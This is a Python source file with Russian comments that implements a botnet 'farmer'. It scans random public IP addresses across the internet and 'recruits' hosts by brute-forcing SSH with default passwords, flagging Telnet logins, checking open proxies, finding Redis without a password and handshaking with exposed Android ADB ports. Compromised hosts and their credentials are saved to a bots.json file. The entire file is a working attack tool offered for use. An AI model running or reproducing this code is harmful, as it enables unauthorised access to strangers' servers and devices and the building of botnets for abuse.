import socket
import threading
import time
import random
import json
import os
import requests
from datetime import datetime

# Опционально: модуль paramiko для SSH. Если не установлен — откат к базовым проверкам.
try:
    import paramiko
except ImportError:
    paramiko = None

# ─── ОСНОВНАЯ ЛОГИКА ФАРМЕРА MFFY ───────────────────────────────────────────

class MFFYFarmer:
    def __init__(self, log_callback=None):
        """ Инициализация фармера. Поддержка коллбэка для логов, загрузка базы. """
        self.log_callback = log_callback or (lambda m: print(f"[MFFY-FARMER] {m}"))
        self.is_running = False
        self.total_scanned = 0
        self.total_recruited = 0
        self.bots = []
        self.max_threads = 200 # Лимит потоков для стабильности работы
        self.semaphore = threading.Semaphore(self.max_threads)
        self.db_path = os.path.join(os.path.dirname(__file__), "..", "bots.json")
        self._load_bots()

    def log(self, msg):
        self.log_callback(msg)

    def _load_bots(self):
        """ Загрузка списка завербованных ботов из файла bots.json. """
        if os.path.exists(self.db_path):
            try:
                with open(self.db_path, "r") as f:
                    data = json.load(f)
                    self.bots = data.get("bots", [])
                    self.total_recruited = len(self.bots)
            except: pass

    def start_scanning(self):
        """ Запуск процесса фонового сканирования и вербовки. """
        if self.is_running: return
        self.is_running = True
        self.log("[FARMER] Запуск сканирования и вербовки в реальном времени...")
        threading.Thread(target=self._scan_loop, daemon=True).start()

    def stop_scanning(self):
        """ Остановка всех операций сканирования. """
        self.is_running = False
        self.log("[FARMER] Сканирование остановлено. Данные сохранены.")

    def _generate_random_ip(self):
        """ Генератор случайных публичных IPv4-адресов. Исключает частные подсети. """
        while True:
            a = random.randint(1, 239)
            if a in [10, 127, 169, 172, 192]: continue # Пропускаем локальные и системные диапазоны
            b, c, d = (random.randint(0, 255) for _ in range(3))
            return f"{a}.{b}.{c}.{d}"

    def _scan_loop(self):
        """ Постоянный цикл генерации и проверки IP-адресов. """
        while self.is_running:
            ip = self._generate_random_ip()
            threading.Thread(target=self._test_target_full, args=(ip,), daemon=True).start()
            self.total_scanned += 1
            time.sleep(0.005) # Плавная задержка для предотвращения перегрузки сокетов

    def _test_target_full(self, ip):
        """ Проверка открытых портов на целевом IP. """
        with self.semaphore:
            # Приоритетные порты для современных методов вербовки
            ports = [22, 23, 80, 8080, 3128, 6379, 5555]
            for port in ports:
                if not self.is_running: break
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(1.0)
                    if s.connect_ex((ip, port)) == 0:
                        self.log(f"[ОБНАРУЖЕНО] Активность на {ip}:{port}")
                        self._handle_recruitment(ip, port)
                    s.close()
                except: pass

    def _handle_recruitment(self, ip, port):
        """ Логика обработки найденного порта (вербовка соответствующего типа). """
        if port == 22:
            self._recruit_ssh(ip)
        elif port == 23:
            self._recruit_telnet(ip)
        elif port in [80, 8080, 3128]:
            self._recruit_proxy(ip, port)
        elif port == 6379:
            self._recruit_redis(ip)
        elif port == 5555:
            self._recruit_adb(ip)

    def _recruit_ssh(self, ip):
        """ Настоящая логика брутфорса SSH. Использует топ-комбинации паролей. """
        creds = [("root", "root"), ("admin", "admin"), ("root", "123456"), ("admin", "1234")]
        if not paramiko:
            self.log(f"[ВНИМАНИЕ] Модуль Paramiko не установлен. Проверка SSH для {ip} невозможна.")
            return

        for user, pwd in creds:
            if not self.is_running: break
            try:
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(ip, port=22, username=user, password=pwd, timeout=3)
                self.log(f"[ВЕРБОВКА] SSH Успех! Завербован: {ip} через {user}:{pwd}")
                self._add_bot(ip, 22, "ssh", f"{user}:{pwd}")
                ssh.close()
                return
            except: pass

    def _recruit_telnet(self, ip):
        """ Проверка доступности Telnet и детектирование баннера логина. """
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((ip, 23))
            banner = s.recv(1024).lower()
            if b"login" in banner or b"username" in banner:
                self.log(f"[ВЕРБОВКА] Обнаружена цель Telnet: {ip}")
                self._add_bot(ip, 23, "telnet", "unauth")
            s.close()
        except: pass

    def _recruit_proxy(self, ip, port):
        """ Валидатор прокси - проверяет работоспособность через запрос к ipify. """
        try:
            proxies = {"http": f"http://{ip}:{port}", "https": f"http://{ip}:{port}"}
            r = requests.get("http://api.ipify.org", proxies=proxies, timeout=3)
            if r.status_code == 200:
                self.log(f"[ВЕРБОВКА] Прокси подтвержден: {ip}:{port}")
                self._add_bot(ip, port, "proxy", "l7")
        except: pass

    def _recruit_redis(self, ip):
        """ Рекрутинг Redis (проверка на отсутствие пароля). """
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1.5)
            s.connect((ip, 6379))
            s.send(b"*1\r\n$4\r\nINFO\r\n")
            resp = s.recv(1024)
            if b"redis_version" in resp:
                self.log(f"[ВЕРБОВКА] Обнаружен Redis без пароля: {ip}")
                self._add_bot(ip, 6379, "redis", "unauth")
            s.close()
        except: pass

    def _recruit_adb(self, ip):
        """ Рекрутинг ADB (отладочный порт Android). """
        try:
            with socket.create_connection((ip, 5555), timeout=1.5) as s:
                s.send(b"CNXN\x00\x00\x00\x01\x00\x10\x00\x00\x07\x00\x00\x00\x01\x00\x00\x00host::\x00")
                if b"CNXN" in s.recv(24):
                    self.log(f"[ВЕРБОВКА] Android ADB подтвержден! Устройство: {ip}")
                    self._add_bot(ip, 5555, "adb", "dev")
        except: pass

    def _add_bot(self, ip, port, kind, creds):
        """ Добавление нового бота в общий список и сохранение базы. """
        addr = f"{ip}:{port}"
        # Проверка на дубликаты
        if any(b.get("addr") == addr for b in self.bots): return

        bot = {
            "addr": f"{ip}:{port}",
            "type": kind,
            "creds": creds,
            "last_seen": datetime.now().isoformat(),
            "is_online": True
        }
        self.bots.append(bot)
        self.total_recruited = len(self.bots)
        self._save_bots()

    def _save_bots(self):
        """ Сохранение списка ботов в JSON с защитой от ошибок записи. """
        try:
            data = {"bots": self.bots, "total": len(self.bots), "last_sync": datetime.now().isoformat()}
            with open(self.db_path, "w") as f:
                json.dump(data, f, indent=4)
        except Exception as e:
            self.log(f"[ОШИБКА] Не удалось сохранить базу: {e}")
